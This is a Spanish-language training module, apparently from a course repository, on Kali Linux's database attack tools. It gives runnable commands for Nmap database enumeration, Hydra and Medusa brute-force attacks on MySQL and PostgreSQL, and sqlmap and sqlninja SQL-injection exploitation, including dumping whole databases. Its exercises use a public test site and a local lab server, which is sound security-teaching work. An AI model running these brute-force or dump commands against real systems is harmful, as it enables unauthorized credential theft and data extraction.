![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **MÓDULO DE APRENDIZAJE: KALI-TOOLS-DATABASE - HERRAMIENTAS PARA ATAQUES A BASES DE DATOS**

## **1. INTRODUCCIÓN AL METAPAQUETE `kali-tools-database`**

Kali Linux proporciona metapaquetes que agrupan herramientas específicas según el tipo de ataque que se desea realizar. En este caso, **`kali-tools-database`** incluye herramientas diseñadas para **realizar ataques, auditorías y análisis de seguridad en bases de datos**.

### **1.1 Objetivo del Metapaquete**

El metapaquete **`kali-tools-database`** permite:

- Identificar bases de datos accesibles en una red o aplicación web.
- Explorar y enumerar información en bases de datos.
- Exploitar vulnerabilidades en bases de datos, como **inyecciones SQL y credenciales débiles**.
- Realizar ataques de fuerza bruta contra servidores de bases de datos.
- Auditar configuraciones de seguridad en sistemas de gestión de bases de datos.

### **1.2 Instalación del Metapaquete**

Para instalar todas las herramientas incluidas en `kali-tools-database`, ejecuta:

```bash
sudo apt update
sudo apt install kali-tools-database -y
```

🔗 **Referencia oficial:** https://www.kali.org/tools/kali-tools-database/

------

## **2. HERRAMIENTAS INCLUIDAS EN `kali-tools-database` Y SU USO PRÁCTICO**

A continuación, exploramos las herramientas más importantes de este metapaquete y ejemplos de uso.

------

### **2.1 Descubrimiento y Enumeración de Bases de Datos**

Antes de atacar una base de datos, es importante encontrar su ubicación y recopilar información sobre su configuración.

#### **2.1.1 Nmap (Scripts NSE para bases de datos)**

*Nmap* puede detectar bases de datos en una red mediante scripts NSE específicos.

```bash
nmap -p 3306,5432,1521,1433 --script=mysql-info,pgsql-info,mssql-info 192.168.1.0/24
```

🔹 **Explicación:** Escanea los puertos de bases de datos más comunes e intenta extraer información.

------

### **2.2 Ataques de Fuerza Bruta a Credenciales de Bases de Datos**

Muchas bases de datos están mal configuradas con credenciales débiles, lo que permite ataques de fuerza bruta.

#### **2.2.1 Hydra - Ataque de Fuerza Bruta a MySQL**

```bash
hydra -L usuarios.txt -P passwords.txt 192.168.1.100 mysql -V
```

🔹 **Explicación:** Intenta encontrar combinaciones de usuario y contraseña en un servidor MySQL.

#### **2.2.2 Medusa - Ataque a PostgreSQL**

```bash
medusa -h 192.168.1.100 -U usuarios.txt -P passwords.txt -M postgres
```

🔹 **Explicación:** Prueba diferentes combinaciones de usuario/contraseña en PostgreSQL.

------

### **2.3 Explotación de Vulnerabilidades en Bases de Datos**

Las bases de datos pueden ser vulnerables a diferentes tipos de ataques, especialmente inyecciones SQL.

#### **2.3.1 SQLmap - Automatización de Ataques de Inyección SQL**

```bash
sqlmap -u "http://objetivo.com/product.php?id=1" --dbs
```

🔹 **Explicación:** Identifica y explota inyecciones SQL en aplicaciones web.

Ejemplo más avanzado:

```bash
sqlmap -u "http://objetivo.com/product.php?id=1" --dump-all
```

🔹 **Extrae toda la información de la base de datos si es vulnerable.**

------

### **2.4 Auditoría de Seguridad en Bases de Datos**

Estas herramientas permiten evaluar la seguridad de las configuraciones en sistemas de bases de datos.

#### **2.4.1 PostgreSQL Audit (pgAudit)**

- Instalación:

  ```bash
  sudo apt install pgaudit
  ```

- Activación:

  ```bash
  ALTER SYSTEM SET pgaudit.log = 'all';
  SELECT * FROM pg_stat_activity;
  ```

#### **2.4.2 SQLNinja - Explotación Avanzada de SQL Injection en MSSQL**

```bash
sqlninja -m test -f sqlninja.conf
```

🔹 **Explicación:** SQLNinja automatiza la explotación de SQL Injection en servidores Microsoft SQL Server.

------

## **3. PRÁCTICAS Y EJERCICIOS**

A continuación, ejercicios prácticos para reforzar el aprendizaje.

### **3.1 Ejercicio 1: Descubrimiento de Bases de Datos con Nmap**

1. Ejecutar un escaneo en la red para detectar bases de datos activas:

   ```bash
   nmap -p 3306,5432,1433,1521 --script=mysql-info,pgsql-info,mssql-info 192.168.1.0/24
   ```

2. Identificar servicios expuestos.

------

### **3.2 Ejercicio 2: Fuerza Bruta en MySQL con Hydra**

1. Ejecutar un ataque de fuerza bruta:

   ```bash
   hydra -L usuarios.txt -P passwords.txt 192.168.1.100 mysql -V
   ```

2. Comprobar si se encuentra una credencial válida.

------

### **3.3 Ejercicio 3: Ataque de Inyección SQL con SQLmap**

1. Identificar bases de datos vulnerables:

   ```bash
   sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
   ```

2. Extraer información de tablas sensibles:

   ```bash
   sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --tables -D acuart
   ```

------

## **4. PROYECTO FINAL: EVALUACIÓN DE SEGURIDAD EN UN SERVIDOR DE BASES DE DATOS**

En este proyecto, instalaremos un servidor vulnerable y realizaremos ataques controlados.

### **4.1 Instalación de un Servidor MySQL Vulnerable**

```bash
sudo apt install mysql-server -y
sudo systemctl start mysql
sudo mysql_secure_installation
```

1. **Configurar una contraseña débil** para probar fuerza bruta.
2. **Crear una base de datos con información simulada**.

### **4.2 Ataques y Auditoría**

1. Escanear el servidor con Nmap

    para identificar el servicio:

   ```bash
   nmap -p 3306 --script=mysql-info 127.0.0.1
   ```

2. **Ejecutar un ataque de fuerza bruta con Hydra** para encontrar credenciales débiles.

3. **Intentar una inyección SQL con SQLmap**.

------

## **5. CONCLUSIÓN Y SIGUIENTES PASOS**

Este módulo cubre el uso del metapaquete `kali-tools-database` para **pruebas de seguridad en bases de datos**. Desde el descubrimiento y enumeración hasta la explotación de vulnerabilidades, estas herramientas permiten realizar auditorías completas.

🔹 **Siguientes pasos:**

- Explorar herramientas avanzadas como **NoSQLMap** para ataques a bases de datos NoSQL.
- Aprender sobre **seguridad en bases de datos en la nube** con AWS RDS y Google Cloud SQL.
- Implementar **buenas prácticas de seguridad** para proteger bases de datos empresariales.





![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)